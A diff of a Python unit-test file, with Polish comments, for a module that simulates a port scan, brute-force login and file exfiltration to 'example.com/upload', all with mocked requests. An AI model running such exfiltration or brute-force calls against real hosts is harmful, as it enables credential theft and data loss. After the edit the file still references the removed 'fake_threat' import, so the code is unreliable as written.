@@ -1,8 +1,9 @@
-# test_fake_attack.py
+# tests/test_fake_attack.py
 import unittest
 from unittest.mock import patch, MagicMock
 import requests
-import fake_threat  # Poprawiony import
+#Corrected absolute import:
+from fake_threat import simulate_port_scan, simulate_brute_force_login, simulate_data_exfiltration, generate_random_string
 import logging
 
 # Wyłącz zbędne logi z biblioteki requests
@@ -20,7 +21,7 @@ class TestFakeThreat(unittest.TestCase):
         mock_get.return_value = mock_response
 
         with self.assertLogs(level='WARNING') as cm:
-            fake_threat.simulate_port_scan('127.0.0.1', 80, 80)
+            simulate_port_scan('127.0.0.1', 80, 80)
         self.assertIn("wydaje się być otwarty", cm.output[0])
 
 
@@ -30,7 +31,7 @@ class TestFakeThreat(unittest.TestCase):
         mock_get.side_effect = requests.exceptions.RequestException("Connection refused")
 
         with self.assertLogs(level='DEBUG') as cm:
-             fake_threat.simulate_port_scan('127.0.0.1', 80, 80)
+             simulate_port_scan('127.0.0.1', 80, 80)
         self.assertIn("prawdopodobnie zamknięty", cm.output[0])
 
     @patch('requests.post')
@@ -44,7 +45,7 @@ class TestFakeThreat(unittest.TestCase):
 
         # Użyj pliku z hasłami w trybie testowym (umieść go w katalogu testów!)
         with self.assertLogs(level='CRITICAL') as cm:
-            fake_threat.simulate_brute_force_login('http://example.com/login', 'admin', 'test_passwords.txt') # TESTOWY PLIK
+            simulate_brute_force_login('http://example.com/login', 'admin', ['password']) # TESTOWY PLIK
         self.assertIn("Udało się złamać hasło!", cm.output[0])
 
 
@@ -56,7 +57,7 @@ class TestFakeThreat(unittest.TestCase):
         mock_post.return_value = mock_response
 
         with self.assertLogs(level='INFO') as cm:
-            fake_threat.simulate_brute_force_login('http://example.com/login', 'admin', 'test_passwords.txt')
+            simulate_brute_force_login('http://example.com/login', 'admin', ['wrong'])
         self.assertTrue(any("Nieudana próba z hasłem" in log for log in cm.output))  # Sprawdź, czy są logi o nieudanych próbach
         self.assertTrue(any("Zakończono symulację ataku brute-force. Hasło nie zostało złamane." in log for log in cm.output)) # Sprawdz log o zakończeniu
 
@@ -64,7 +65,7 @@ class TestFakeThreat(unittest.TestCase):
     def test_simulate_brute_force_login_file_not_found(self, mock_post):
        """Testuje przypadek, gdy pliku z hasłami nie znaleziono"""
        with self.assertLogs(level='ERROR') as cm:
-           fake_threat.simulate_brute_force_login('http://example.com/login', 'admin', 'nonexistent_file.txt')
+           simulate_brute_force_login('http://example.com/login', 'admin', 'nonexistent_file.txt')
        self.assertIn("Nie znaleziono pliku z hasłami", cm.output[0])
 
 
@@ -76,7 +77,7 @@ class TestFakeThreat(unittest.TestCase):
         mock_post.return_value = mock_response
 
         with self.assertLogs(level='CRITICAL') as cm:
-            fake_threat.simulate_data_exfiltration('http://example.com/upload', 'test_secret.txt') #TESTOWY PLIK
+            simulate_data_exfiltration('http://example.com/upload', 'test_secret.txt') #TESTOWY PLIK
         self.assertIn("Eksfiltracja pliku 'test_secret.txt' powiodła się!", cm.output[0])
 
     @patch('requests.post')
@@ -87,7 +88,7 @@ class TestFakeThreat(unittest.TestCase):
         mock_post.return_value = mock_response
 
         with self.assertLogs(level='WARNING') as cm:
-            fake_threat.simulate_data_exfiltration('http://example.com/upload', 'test_secret.txt')
+            simulate_data_exfiltration('http://example.com/upload', 'test_secret.txt')
         self.assertIn("Eksfiltracja pliku 'test_secret.txt' nie powiodła się", cm.output[0])
 
 
@@ -95,7 +96,7 @@ class TestFakeThreat(unittest.TestCase):
     def test_simulate_data_exfiltration_file_not_found(self, mock_post):
         """Test eksfiltracji, gdy plik nie istnieje."""
         with self.assertLogs(level='ERROR') as cm:
-            fake_threat.simulate_data_exfiltration('http://example.com/upload', 'nonexistent_file.txt')
+            simulate_data_exfiltration('http://example.com/upload', 'nonexistent_file.txt')
         self.assertIn("Nie znaleziono pliku do eksfiltracji", cm.output[0])
 
 
@@ -108,7 +109,7 @@ class TestFakeThreat(unittest.TestCase):
         mock_gen_str.assert_called_once_with() # Sprawdzamy czy funkcja została wywołana
 
     @patch('fake_threat.generate_random_string')
-    def test_generate_random_string_custom_length(self, mock_gen_str): # Poprawiony
+    def test_generate_random_string_custom_length(self, mock_gen_str):
         """Test generatora z określoną długością."""
         mock_gen_str.return_value = "abc"
         result = fake_threat.generate_random_string(length=3)
